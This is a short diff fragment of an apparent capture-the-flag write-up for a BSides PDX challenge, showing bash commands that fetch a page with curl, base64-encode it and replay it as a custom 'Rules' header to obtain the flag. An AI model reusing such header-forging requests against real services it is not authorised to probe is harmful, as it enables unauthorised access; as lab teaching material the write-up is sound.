@@ -28,7 +28,9 @@ If we take what we did for the rules page and follow the same process of taking 
 Now if we do on a bash command line
 
 `header=$(curl heading-the-right-way.bsidespdxctf.party:8081/security | base64)`
+
 `headernospace="$(echo -e "${header}" | tr -d '[:space:]')"`
+
 `curl localhost:8081/security -H "Rules: $headernospace"`
 
 we will get the flag :)
